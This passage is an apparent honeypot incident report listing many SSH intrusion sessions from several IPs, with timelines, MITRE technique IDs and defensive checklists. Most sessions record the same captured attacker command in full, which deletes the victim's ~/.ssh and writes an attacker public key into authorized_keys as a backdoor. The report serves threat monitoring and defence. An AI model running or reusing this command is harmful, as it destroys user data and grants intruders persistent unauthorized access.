| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:03:14` | `cowrie.session.connect` |
| `2026-04-10 15:03:14` | `cowrie.client.version` |
| `2026-04-10 15:03:15` | `cowrie.client.kex` |
| `2026-04-10 15:03:16` | `cowrie.login.success` |
| `2026-04-10 15:03:17` | `cowrie.session.params` |
| `2026-04-10 15:03:17` | `cowrie.command.input` |
| `2026-04-10 15:03:17` | `cowrie.command.failed` |
| `2026-04-10 15:03:17` | `cowrie.log.closed` |
| `2026-04-10 15:03:18` | `cowrie.session.params` |
| `2026-04-10 15:03:18` | `cowrie.command.input` |
| `2026-04-10 15:03:18` | `cowrie.session.file_download` |
| `2026-04-10 15:03:18` | `cowrie.log.closed` |
| `2026-04-10 15:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e2ee38ef640

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 15:03 |
| **Last Seen** | 2026-04-10 15:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:03:22` | `cowrie.session.connect` |
| `2026-04-10 15:03:22` | `cowrie.client.version` |
| `2026-04-10 15:03:23` | `cowrie.client.kex` |
| `2026-04-10 15:03:24` | `cowrie.login.success` |
| `2026-04-10 15:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-911b47c6a1ad

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 15:07 |
| **Last Seen** | 2026-04-10 15:07 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:07:00` | `cowrie.session.connect` |
| `2026-04-10 15:07:00` | `cowrie.client.version` |
| `2026-04-10 15:07:00` | `cowrie.client.kex` |
| `2026-04-10 15:07:02` | `cowrie.login.success` |
| `2026-04-10 15:07:02` | `cowrie.session.params` |
| `2026-04-10 15:07:02` | `cowrie.command.input` |
| `2026-04-10 15:07:02` | `cowrie.command.failed` |
| `2026-04-10 15:07:03` | `cowrie.log.closed` |
| `2026-04-10 15:07:03` | `cowrie.session.params` |
| `2026-04-10 15:07:03` | `cowrie.command.input` |
| `2026-04-10 15:07:04` | `cowrie.session.file_download` |
| `2026-04-10 15:07:04` | `cowrie.log.closed` |
| `2026-04-10 15:07:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b31231772361

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 15:07 |
| **Last Seen** | 2026-04-10 15:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:07:08` | `cowrie.session.connect` |
| `2026-04-10 15:07:08` | `cowrie.client.version` |
| `2026-04-10 15:07:08` | `cowrie.client.kex` |
| `2026-04-10 15:07:09` | `cowrie.login.success` |
| `2026-04-10 15:07:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1e84deb3c00

| Field | Detail |
|---|---|
| **Source IP** | `111.228.6[.]161` |
| **First Seen** | 2026-04-10 15:09 |
| **Last Seen** | 2026-04-10 15:14 |
| **Session Duration** | 306s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:09:40` | `cowrie.session.connect` |
| `2026-04-10 15:09:40` | `cowrie.client.version` |
| `2026-04-10 15:09:41` | `cowrie.client.kex` |
| `2026-04-10 15:09:46` | `cowrie.login.success` |
| `2026-04-10 15:10:01` | `cowrie.session.params` |
| `2026-04-10 15:10:01` | `cowrie.command.input` |
| `2026-04-10 15:10:01` | `cowrie.session.file_download` |
| `2026-04-10 15:10:01` | `cowrie.log.closed` |
| `2026-04-10 15:14:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.228.6[.]161` to AbuseIPDB if not already reported
- [ ] Block `111.228.6[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6a0da3234b6

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 15:12 |
| **Last Seen** | 2026-04-10 15:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:12:53` | `cowrie.session.connect` |
| `2026-04-10 15:12:53` | `cowrie.client.version` |
| `2026-04-10 15:12:53` | `cowrie.client.kex` |
| `2026-04-10 15:12:55` | `cowrie.login.success` |
| `2026-04-10 15:12:56` | `cowrie.session.params` |
| `2026-04-10 15:12:56` | `cowrie.command.input` |
| `2026-04-10 15:12:56` | `cowrie.command.failed` |
| `2026-04-10 15:12:56` | `cowrie.log.closed` |
| `2026-04-10 15:12:57` | `cowrie.session.params` |
| `2026-04-10 15:12:57` | `cowrie.command.input` |
| `2026-04-10 15:12:57` | `cowrie.session.file_download` |
| `2026-04-10 15:12:57` | `cowrie.log.closed` |
| `2026-04-10 15:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44fb6666e31c

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 15:13 |
| **Last Seen** | 2026-04-10 15:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:13:01` | `cowrie.session.connect` |
| `2026-04-10 15:13:01` | `cowrie.client.version` |
| `2026-04-10 15:13:01` | `cowrie.client.kex` |
| `2026-04-10 15:13:03` | `cowrie.login.success` |
| `2026-04-10 15:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0644ea13eb6

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 15:14 |
| **Last Seen** | 2026-04-10 15:15 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:14:54` | `cowrie.session.connect` |
| `2026-04-10 15:14:54` | `cowrie.client.version` |
| `2026-04-10 15:14:54` | `cowrie.client.kex` |
| `2026-04-10 15:14:56` | `cowrie.login.success` |
| `2026-04-10 15:14:56` | `cowrie.session.params` |
| `2026-04-10 15:14:56` | `cowrie.command.input` |
| `2026-04-10 15:14:56` | `cowrie.command.failed` |
| `2026-04-10 15:14:57` | `cowrie.log.closed` |
| `2026-04-10 15:14:58` | `cowrie.session.params` |
| `2026-04-10 15:14:58` | `cowrie.command.input` |
| `2026-04-10 15:14:58` | `cowrie.session.file_download` |
| `2026-04-10 15:14:58` | `cowrie.log.closed` |
| `2026-04-10 15:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c0f804a7639

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 15:15 |
| **Last Seen** | 2026-04-10 15:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:15:02` | `cowrie.session.connect` |
| `2026-04-10 15:15:02` | `cowrie.client.version` |
| `2026-04-10 15:15:02` | `cowrie.client.kex` |
| `2026-04-10 15:15:04` | `cowrie.login.success` |
| `2026-04-10 15:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ea7515c8e11

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 15:24 |
| **Last Seen** | 2026-04-10 15:24 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:24:31` | `cowrie.session.connect` |
| `2026-04-10 15:24:31` | `cowrie.client.version` |
| `2026-04-10 15:24:31` | `cowrie.client.kex` |
| `2026-04-10 15:24:33` | `cowrie.login.success` |
| `2026-04-10 15:24:33` | `cowrie.session.params` |
| `2026-04-10 15:24:33` | `cowrie.command.input` |
| `2026-04-10 15:24:33` | `cowrie.command.failed` |
| `2026-04-10 15:24:34` | `cowrie.log.closed` |
| `2026-04-10 15:24:35` | `cowrie.session.params` |
| `2026-04-10 15:24:35` | `cowrie.command.input` |
| `2026-04-10 15:24:35` | `cowrie.session.file_download` |
| `2026-04-10 15:24:35` | `cowrie.log.closed` |
| `2026-04-10 15:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df5d2a11c5e5

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 15:24 |
| **Last Seen** | 2026-04-10 15:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:24:39` | `cowrie.session.connect` |
| `2026-04-10 15:24:39` | `cowrie.client.version` |
| `2026-04-10 15:24:39` | `cowrie.client.kex` |
| `2026-04-10 15:24:41` | `cowrie.login.success` |
| `2026-04-10 15:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-182e37976303

| Field | Detail |
|---|---|
| **Source IP** | `47.251.8[.]86` |
| **First Seen** | 2026-04-10 15:29 |
| **Last Seen** | 2026-04-10 15:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:29:51` | `cowrie.session.connect` |
| `2026-04-10 15:29:51` | `cowrie.client.version` |
| `2026-04-10 15:29:51` | `cowrie.client.kex` |
| `2026-04-10 15:29:53` | `cowrie.login.success` |
| `2026-04-10 15:29:53` | `cowrie.session.params` |
| `2026-04-10 15:29:53` | `cowrie.command.input` |
| `2026-04-10 15:29:53` | `cowrie.command.failed` |
| `2026-04-10 15:29:54` | `cowrie.log.closed` |
| `2026-04-10 15:29:54` | `cowrie.session.params` |
| `2026-04-10 15:29:54` | `cowrie.command.input` |
| `2026-04-10 15:29:54` | `cowrie.session.file_download` |
| `2026-04-10 15:29:54` | `cowrie.log.closed` |
| `2026-04-10 15:29:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.251.8[.]86` to AbuseIPDB if not already reported
- [ ] Block `47.251.8[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a60c3a81eb3

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-04-10 15:29 |
| **Last Seen** | 2026-04-10 15:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:29:57` | `cowrie.session.connect` |
| `2026-04-10 15:29:57` | `cowrie.client.version` |
| `2026-04-10 15:29:58` | `cowrie.client.kex` |
| `2026-04-10 15:29:58` | `cowrie.login.success` |
| `2026-04-10 15:29:59` | `cowrie.session.params` |
| `2026-04-10 15:29:59` | `cowrie.command.input` |
| `2026-04-10 15:29:59` | `cowrie.command.failed` |
| `2026-04-10 15:29:59` | `cowrie.log.closed` |
| `2026-04-10 15:29:59` | `cowrie.session.params` |
| `2026-04-10 15:29:59` | `cowrie.command.input` |
| `2026-04-10 15:29:59` | `cowrie.session.file_download` |
| `2026-04-10 15:29:59` | `cowrie.log.closed` |
| `2026-04-10 15:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b6a7d940471

| Field | Detail |
|---|---|
| **Source IP** | `47.251.8[.]86` |
| **First Seen** | 2026-04-10 15:29 |
| **Last Seen** | 2026-04-10 15:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:29:57` | `cowrie.session.connect` |
| `2026-04-10 15:29:57` | `cowrie.client.version` |
| `2026-04-10 15:29:58` | `cowrie.client.kex` |
| `2026-04-10 15:29:59` | `cowrie.login.success` |
| `2026-04-10 15:29:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.251.8[.]86` to AbuseIPDB if not already reported
- [ ] Block `47.251.8[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9602fe37b53

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-04-10 15:30 |
| **Last Seen** | 2026-04-10 15:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:30:02` | `cowrie.session.connect` |
| `2026-04-10 15:30:02` | `cowrie.client.version` |
| `2026-04-10 15:30:02` | `cowrie.client.kex` |
| `2026-04-10 15:30:03` | `cowrie.login.success` |
| `2026-04-10 15:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12d7499b4f34

| Field | Detail |
|---|---|
| **Source IP** | `189.147.20[.]241` |
| **First Seen** | 2026-04-10 15:30 |
| **Last Seen** | 2026-04-10 15:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:30:32` | `cowrie.session.connect` |
| `2026-04-10 15:30:32` | `cowrie.client.version` |
| `2026-04-10 15:30:33` | `cowrie.client.kex` |
| `2026-04-10 15:30:34` | `cowrie.login.success` |
| `2026-04-10 15:30:34` | `cowrie.session.params` |
| `2026-04-10 15:30:34` | `cowrie.command.input` |
| `2026-04-10 15:30:34` | `cowrie.command.failed` |
| `2026-04-10 15:30:35` | `cowrie.log.closed` |
| `2026-04-10 15:30:35` | `cowrie.session.params` |
| `2026-04-10 15:30:35` | `cowrie.command.input` |
| `2026-04-10 15:30:36` | `cowrie.session.file_download` |
| `2026-04-10 15:30:36` | `cowrie.log.closed` |
| `2026-04-10 15:30:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.147.20[.]241` to AbuseIPDB if not already reported
- [ ] Block `189.147.20[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b55984d74259

| Field | Detail |
|---|---|
| **Source IP** | `189.147.20[.]241` |
| **First Seen** | 2026-04-10 15:30 |
| **Last Seen** | 2026-04-10 15:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:30:39` | `cowrie.session.connect` |
